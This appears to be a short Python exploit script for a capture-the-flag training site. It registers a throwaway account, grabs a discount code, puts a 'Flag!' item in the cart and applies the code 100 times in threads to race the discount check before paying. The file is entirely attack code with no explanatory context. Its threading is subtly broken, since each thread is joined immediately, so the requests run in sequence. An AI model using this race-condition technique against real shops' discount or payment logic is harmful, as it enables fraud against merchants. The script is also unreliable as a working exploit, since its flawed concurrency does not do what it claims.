import requests
import threading
from threading import Thread
import time
import random
import string


URL="http://discount.training.offdef.it/"

def login(session, username, password):
    target = URL + "login"
    r = session.post(target, data={'username': username, 'password': password})
    return r

def register(session, username, password):
    target = URL + "register"
    r = session.post(target, data={'username': username, 'password': password})
    if 'Code' in r.text:
        return (r.text).split('Code: ')[1].split('</div>')[0]

def apply_discount(session, code):
    target = URL + "apply_discount"
    r = session.post(target, data=code)
    return r

def add_to_cart(session, item='Flag!'):
    target = URL + "add_to_cart"
    r = session.get(target, data=item)
    return r

def pay(session):
    target = URL + "cart/pay"
    r = session.get(target)
    print(r.text)

def id_generator(size=10, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for i in range(size))



s = requests.Session()
u = id_generator()
p = id_generator()
discount_code = register(s, u, p)
add_to_cart(s)

i=0
while (i<100):
    t = Thread(target=apply_discount, args=(s, discount_code))
    t.start()
    t.join()
    i+=1

pay(s)


